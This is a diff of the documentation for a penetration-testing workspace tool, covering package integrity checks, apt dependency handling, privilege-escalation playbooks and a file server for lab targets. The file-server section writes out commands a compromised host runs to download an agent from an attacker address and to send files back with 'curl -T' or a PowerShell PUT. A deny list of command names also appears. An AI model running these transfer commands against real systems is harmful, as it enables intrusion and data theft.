@@ -347,6 +347,7 @@ Those are the shape of the output, not recorded runs. The runtime's size is its 
 A package is one zip for one build of one tool: a manifest, the upstream licence, the tool's own files exactly as upstream published them, and, for a Python tool, every dependency as a wheel with its SHA-256 recorded. A package holds no install script, and nothing from it runs during install.
 
 - Every download and every cached zip is checked against the size and SHA-256 in the index before it is used. The index itself is not signed, so the check catches corruption and a swapped zip, not who published the index.
+- A package download is cut off at the size the index gives and gets five minutes in all, however slowly the server sends. The index may give a package no more than 1,082,130,432 bytes: the 1 GiB a package may unpack to, and 8 MiB for the lists of its entries. An index that gives more is refused.
 - A Python tool gets its own virtual environment, built from the bundled wheels with no network access, wheels only and hash checking on. Its `wheels.lock` is checked line by line before pip reads it.
 - The first set of packages is x86_64 only, and a package built for another architecture is refused at install.
 - A package's commands may not take a name that must never be stood in for:
@@ -358,7 +359,7 @@ A package is one zip for one build of one tool: a manifest, the upstream licence
     - what other programs start to show or edit something: `less`, `more`, `pager`, `man`, `nano`, `editor`
     - what manages the system or fetches something to run: `apt`, `apt-get`, `dpkg`, `systemctl`, `mount`, `umount`, `curl`, `wget`, `git`
 
-  It is not a list of everything Kali has. A tool may take the name of Kali's own copy of it, and install prints a `warn` line when it does.
+  It is not a list of everything Kali has. A tool may take the name of Kali's own copy of it, and install prints a `warn` line when it does. The installer does not lean on the list: it takes `/opt/pwn-broker/bin` off its own PATH before it runs anything, so an upgrade checks and unpacks the release with Kali's `sha256sum`, `tar` and the rest, whatever a package's commands are called.
 
 ### Runtimes
 
@@ -378,7 +379,9 @@ Package and index schema 4 adds ordinary tool dependencies and optional external
 
 - **Minimal installs bring only what is required.** `tool install <name>` resolves the ordinary dependency graph first, detects missing targets and cycles, and reuses an installed build that is still pinned by the index. A failed graph is rolled back. Another box using the same tool shares it.
 - **`--full` is opt-in.** `tool install <name> --full` additionally selects every optional backend declared by that tool. Package-backed providers are installed from pwn-shop; a dependency's own optional backends are not selected. Repeating a minimal install makes no optional change, while an explicit install of an automatic dependency takes ownership of it.
-- **Apt needs a plan and confirmation.** For each apt-backed feature whose command is missing, `--full` shows the provider and the exact `apt-get install --no-install-recommends` command, with `sudo` when needed, before asking. Declining skips those system packages and continues with pwn-shop's packages. Apt failure aborts the install. Apt packages remain system-owned: rollback, `tool remove` and `finish` never remove them. No recipe-supplied installer is run.
+- **The selection belongs to the box.** The backends `--full` selected are written on the box's own row for the tool in `box.toml` (`optional = ["netexec"]`), so they come back with the tool when the box is reopened or imported, and are not taken for orphans afterwards. Another box that installed the same tool without `--full` stays without them. An archive made by 0.1.14 has no such list: run `tool install <name> --full` once more in that box and it is recorded.
+- **Apt needs a plan and confirmation.** For each apt-backed feature whose command is missing, `--full` first asks apt for its plan (`apt-get install --simulate`, which needs no root and changes nothing) and shows it: the backends, every package apt would install for them, the packages they need included, any it would upgrade, and the exact command, with `sudo` when needed. Then it asks. On yes, `apt-get` runs with `-y` and `DEBIAN_FRONTEND=noninteractive` and is given nothing to read, so neither it nor a package's set-up stops at a question of its own; `sudo` may still ask for your password. Nothing shows while it works. Declining skips those system packages and continues with pwn-shop's packages. A plan that would remove a package is not offered at all: the app says so, installs none of them and continues, and the command carries `--no-remove`, so it cannot remove one either. A settings file you have edited is kept (`--force-confold`). Apt failure, the plan's included, aborts the install. Apt packages remain system-owned: rollback, `tool remove` and `finish` never remove them. No recipe-supplied installer is run.
+- **An apt name is one package's name.** A backend's `apt` entries are lower-case Debian package names that start and end with a letter or digit. `apt-get install nmap-` removes nmap, so a name ending in `-`, `+` or `.` is refused in a manifest and in the index, as is one with a version, a release or a pattern in it, and `apt-get` is told to take each name as it stands (`APT::Cmd::Pattern-Only`), never as a regular expression.
 - **Orphaned automatic dependencies go; explicit tools stay.** `tool remove` refuses a package that one of the box's installed parents still requires. Removing the parent releases only automatic dependencies no remaining tool needs; explicitly installed packages are kept. `finish` follows the same ownership rule, then removes idle runtimes.
 - **Diagnostics are read-only.** `tool doctor <name>` reports runtime and ordinary dependencies, selected package backends, and each optional backend's command, provider and enabled feature. It looks up executables but never runs a backend, installs a package or changes apt state. It uses the box's installed build when present, otherwise the latest index build.
 
@@ -391,7 +394,7 @@ Playbooks are short notes, one per job, that you read into the box's note and fi
 ```
 forest/dc01 > tool install playbooks
 
-  ok    playbooks 2026.11.23 installed (88 playbooks)
+  ok    playbooks 2026.11.26 installed (132 playbooks)
   read  :Pb <name>      in the note window
   list  playbook list   at the prompt
 ```
@@ -406,7 +409,7 @@ forest/dc01 > tool install playbooks
 
     ok    saved: new boxes get the playbooks
           to change it: playbooks = false in /opt/pwn-broker/config.toml
-    ok    playbooks 2026.11.23 installed (88 playbooks)
+    ok    playbooks 2026.11.26 installed (132 playbooks)
     read  :Pb <name>      in the note window
     list  playbook list   at the prompt
   ```
@@ -425,11 +428,11 @@ forest/dc01 > playbook list windows
 
   name                     folder              title
   always-install-elevated  06-privesc/windows  Windows privesc: AlwaysInstallElevated
-  potatoes                 06-privesc/windows  Windows privesc: SeImpersonate and potatoes
+  backup-looting           06-privesc/windows  Backup Software Looting (Veeam)
   ...
   windows-kernel           06-privesc/windows  Windows privesc: kernel exploits
   port-forwarding          08-pivoting         Port forwarding on Windows
-  11 of 88 playbooks in playbooks 2026.11.23; playbook show <name> prints one
+  16 of 132 playbooks in playbooks 2026.11.26; playbook show <name> prints one
 ```
 
 `playbook show <name>` prints one in the terminal: its `Playbook:` line, then the playbook without its fold markers, run block and `END OF` line. It is flush left, so a command copies cleanly, and its placeholders are left as they are, since only the note fills them in. It takes the name `:Pb` takes, or the playbook's path, such as `02-enum/smb`, and Tab completes the name from any part of it. When two installed packages hold the same name, it names both, and `playbook show <package>/<path>` picks one.
@@ -599,15 +602,17 @@ forest/dc01 > serve files agent
         iwr http://10.10.14.5/k7Qx2p/ligolo-ng/agent.exe -OutFile agent.exe
 ```
 
-It also takes files back from the target. A `PUT` to the same address and random part, with a file name, saves the file into the target's `loot/` folder; `serve files` ends with the line to send one, `iwr -Method PUT -InFile <file> http://10.10.14.5/k7Qx2p/<file>` on Windows and `curl -T <file> http://10.10.14.5/k7Qx2p/` on Linux.
+It also takes files back from the target. A `PUT` to the same address and random part, with a file name, saves the file into the target's `loot/` folder; `serve files` ends with the line to send one, `iwr -UseBasicParsing -Method PUT -InFile <file> http://10.10.14.5/k7Qx2p/<file>` on Windows and `curl -T <file> http://10.10.14.5/k7Qx2p/` on Linux.
 
 - `serve` listens on the tunnel's address. `serve eth0` or `serve 192.168.1.20` names an interface or an address of this machine instead; with no tunnel up and nothing named, it says so and starts nothing. `serve 0.0.0.0` listens on every interface, with a `warn` line.
 - The port is 80 as root and 8000 otherwise; `serve tun0 8080` picks one. A port in use is said at once.
 - Every URL starts with a random part, six letters and digits, chosen each time `serve` starts. A request without it gets `404`, so knowing a tool's file name is not enough to fetch it.
 - Nothing is listed: `/`, the random part and every folder get `404`. Only a file asked for by its exact path is sent. A file whose name starts with a dot, a link, or anything outside the two folders is never sent. A file put in `upload/` after the start is served at once.
-- A name at the top of `upload/` that is also a tool's folder is the tool's.
+- A name at the top of `upload/` that is also a tool's folder is the tool's. A file put straight into `/opt/pwn-broker/upload/`, in no tool's folder, is neither listed nor served.
+- On a Windows box, a file whose name holds `[` or `]` gets the line `(New-Object Net.WebClient).DownloadFile('<url>', (Join-Path $pwd '<name>'))`, because Windows PowerShell 5.1 reads those two after `-OutFile` as a pattern and saves nothing. A character a Windows file name cannot hold (`< > : " \ | ? *` or a control character), and each byte of a name that is not UTF-8, is `_` in the name the file is saved under; the URL still names the file as it is. The send-back line has `-UseBasicParsing` because without it Windows PowerShell 5.1 fails in a shell that cannot ask a question, after the file was saved.
 - `serve` again while it runs shows the address, the box and target it serves, and how many files. Naming another address then is refused: `serve stop` first.
-- `serve log` shows the last 20 lines of `/opt/pwn-broker/run/serve/serve.log`: when it started, then one line per request, with the address that asked, the request and the answer.
+- `serve log` shows the last 20 lines of `/opt/pwn-broker/run/serve/serve.log`: when it started, then one line per request, with the address that asked, the request and the answer. A request line longer than 200 characters is cut there, and a connection that ends part of the way through is one line, `the connection ended early: <why>`. Once the log passes 1 MiB only its last half is kept.
+- A connection that sends nothing, or takes nothing, for 30 seconds is closed. An upload that goes quiet is answered `408`; the room held for it is free again and nothing of it stays in `loot/`.
 - It outlives `quit` and a closed window. `finish` lists it in its summary as `serving  http://10.10.14.5/   (will be stopped)` and stops it; a server another box started is left alone.
 - `upload/` is part of the box, so whatever you put there is in its archives.
 - A file sent back lands in `loot/` under its own name, or `name-2` and on when that is taken: nothing there is ever replaced. It needs the random part, one plain name with no folder and no dot at the start, and a length. One file is at most 4 GiB, and one that would leave less than 1 GiB free on the disk is refused with `507`. A transfer cut short leaves nothing. What lands in `loot/` is not served back, and `serve log` shows `saved loot/<name>` beside the request.
